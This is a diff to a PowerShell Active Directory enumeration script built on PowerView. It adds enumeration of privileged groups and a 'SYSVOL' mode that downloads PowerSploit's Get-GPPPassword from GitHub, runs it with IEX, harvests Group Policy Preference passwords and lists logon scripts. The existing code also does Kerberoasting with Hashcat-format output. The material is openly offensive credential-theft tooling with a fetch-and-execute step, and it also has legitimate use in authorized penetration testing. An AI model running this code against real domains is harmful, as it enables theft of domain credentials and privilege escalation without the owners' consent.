@@ -81,7 +81,7 @@ Param(
 	$FQDN,
 	
 	[Parameter(Position = 1)]
-	[ValidateSet('Basic', 'Roasting', 'LargeEnv', 'Special')]
+	[ValidateSet('Basic', 'Roasting', 'LargeEnv', 'Special', 'SYSVOL')]
     [String]
     $Mode = 'Basic',
 
@@ -123,7 +123,6 @@ try {
 if ($Credential -ne $null){
 	try{
 		$NetworkCredential = $Credential.GetNetworkCredential()
-        $Domain = $NetworkCredential.Domain
         $UserName = $NetworkCredential.UserName
 	Write-Host "Impersonate user:$Domain\$Username | " -NoNewLine
 	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
@@ -132,19 +131,14 @@ if ($Credential -ne $null){
 	
 }	
 	
-#Grab Local Domain: Use passed credential ojbject of using PowerView Function If None Provided
-if (!$domain -and $credential -ne $null) {
-$NetworkCredential = $Credential.GetNetworkCredential()
-$Domain = $NetworkCredential.Domain
-}
-elseif (!$domain -and !$Credential) {$domain = (Get-Domain).Name}
-
+#Grab Local Domain
+if (!$domain) {$domain = (Get-Domain).Name}
 if (!$domain) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
 else {Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan}
 
 #Supprese Errors and Warnings
-$ErrorActionPreference = 'Continue'
-$WarningPreference = "SilentlyContinue"
+#$ErrorActionPreference = 'Continue'
+#$WarningPreference = "SilentlyContinue"
 
 #Set up spreadsheet arrary and count
 $script:ExportSheetCount = 1
@@ -159,6 +153,13 @@ if ($Mode -eq 'Basic') {
 	PowEnum-EAs
 	PowEnum-BltAdmins
     PowEnum-DCLocalAdmins
+	PowEnum-SchemaAdmins
+	PowEnum-AccountOperators
+	PowEnum-BackupOperators
+	PowEnum-PrintOperators
+	PowEnum-ServerOperators
+	PowEnum-GPCreatorsOwners
+	PowEnum-CryptographicOperators
 	PowEnum-Users
 	PowEnum-Groups
 	PowEnum-ExcelFile -SpreadsheetName Basic-UsersAndGroups
@@ -215,13 +216,30 @@ elseif ($Mode -eq 'Special') {
 	PowEnum-SmartCardReqPwNotExp
 	PowEnum-ExcelFile -SpreadsheetName Special
 }
+elseif ($Mode -eq 'SYSVOL') {
+	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
+	
+	$webclient = New-Object System.Net.WebClient
+    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+    $URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1"
+    Write-Host "Downloading Get-GPPPassword:" -ForegroundColor Cyan
+    Write-Host "$URL"
+    IEX $webclient.DownloadString($URL)
+	
+	PowEnum-GPPPassword
+	PowEnum-SYSVOLFiles
+	PowEnum-ExcelFile -SpreadsheetName SYSVOL
+}
 else {
 	Write-Host "Incorrect Mode Selected"
 	Return
 }
 
+Remove-Module Powerview
+
 $stopwatch.Stop()
 Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
+Write-Host "Current Date/Time: $(Get-Date)"
 Write-Host "Exiting..." -ForegroundColor Yellow
 }
 
@@ -246,6 +264,62 @@ function PowEnum-EAs {
 		Write-Host "[ ]Enterprise Admins | " -NoNewLine
 		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum EAs
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-SchemaAdmins {
+	try {
+		Write-Host "[ ]Schema Admins | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum SchemaAdmins
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-AccountOperators {
+	try {
+		Write-Host "[ ]Account Operators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum AcctOperators
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-BackupOperators {
+	try {
+		Write-Host "[ ]Backup Operators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum BackupOperators
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-PrintOperators {
+	try {
+		Write-Host "[ ]Print Operators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum PrintOperators
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-ServerOperators {
+	try {
+		Write-Host "[ ]Server Operators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum ServerOperators
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-GPCreatorsOwners {
+	try {
+		Write-Host "[ ]Group Policy Creators Owners | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum GPCreatorsOwners
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-CryptographicOperators {
+	try {
+		Write-Host "[ ]Cryptographic Operators | " -NoNewLine
+		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		PowEnum-ExportAndCount -TypeEnum CryptographicOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
@@ -425,6 +499,24 @@ function PowEnum-Kerberoast {
 		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
 		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $domain -WarningAction silentlyContinue
 		PowEnum-ExportAndCount -TypeEnum Kerberoast
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-GPPPassword {
+	try{
+		Write-Host "[ ]GPP Password(s) | " -NoNewLine
+		$temp = Get-GPPPassword -Server $domain
+		PowEnum-ExportAndCount -TypeEnum GPPPassword
+	}catch {Write-Host "Error" -ForegroundColor Red}
+}
+
+function PowEnum-SYSVOLFiles {
+	try{
+		$pdc = (Get-Domain -Domain $domain).PdcRoleOwner.Name
+		Write-Host "[ ]Potential logon scripts on \\$pdc\SYSVOL | " -NoNewLine
+		$temp = Find-InterestingDomainShareFile -Include @('*.vbs', '*.bat', '*.ps1') -SharePath "\\$pdc\SYSVOL" -ComputerName $pdc
+		Write-Host $temp
+		PowEnum-ExportAndCount -TypeEnum SYSVOLFiles
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
